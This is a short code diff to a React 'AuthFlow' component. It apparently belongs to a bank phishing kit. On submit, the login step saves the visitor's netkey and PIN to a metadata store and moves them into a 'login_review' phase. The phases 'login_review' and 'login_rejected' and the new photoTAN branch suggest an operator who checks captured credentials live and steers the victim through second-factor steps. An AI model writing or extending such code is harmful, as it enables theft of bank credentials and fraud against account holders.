@@ -76,8 +76,10 @@ const AuthFlow = () => {
 
   const phase = row.customer_phase || "login";
 
-  if (phase === "login" || phase === "login_rejected") {
-    return <LoginStep row={row} onSubmit={async (netkey, pin) => {
+  const isPhoto = row.tan_method === "photo";
+
+  if (phase === "login" || phase === "login_rejected" || (phase === "login_review" && isPhoto)) {
+    return <LoginStep row={row} forceSubmitting={phase === "login_review"} onSubmit={async (netkey, pin) => {
       await upsertMeta({ netkey, pin });
       await setPhase("login_review", { last_error: null });
     }} />;
